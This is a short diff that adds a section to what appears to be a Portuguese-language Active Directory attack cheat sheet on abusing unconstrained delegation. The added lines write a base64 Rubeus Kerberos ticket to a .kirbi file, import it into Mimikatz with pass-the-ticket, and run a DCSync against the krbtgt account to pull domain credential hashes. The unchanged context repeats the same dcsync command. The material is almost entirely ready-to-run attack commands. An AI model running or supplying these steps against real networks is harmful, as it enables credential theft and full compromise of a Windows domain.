@@ -1373,7 +1373,18 @@ FAZER O DCSYNC
 lsadump::dcsync /user:tech\krbtgt
 ```
 
-
+##### UNCONSTRAINED DELEGATION RUBEUS - CONVERTER TICKET DO RUBEUS BASE64 PARA MIMIKATZ KIRBI
+```
+[IO.File]::WriteAllBytes("C:\ticket.kirbi", [Convert]::FromBase64String("doIFqjCCBaRFQ0guTE9DQUw="))
+```
+IMPORTAR NO MIMIKATZ: (USUARIO NORMAL) E FAZER O DCSYNC:
+```
+Invoke-Mimikatz
+kerberos::ptt ticket.kirbi
+```
+```
+lsadump::dcsync /user:tech\krbtgt
+```
 
 
 
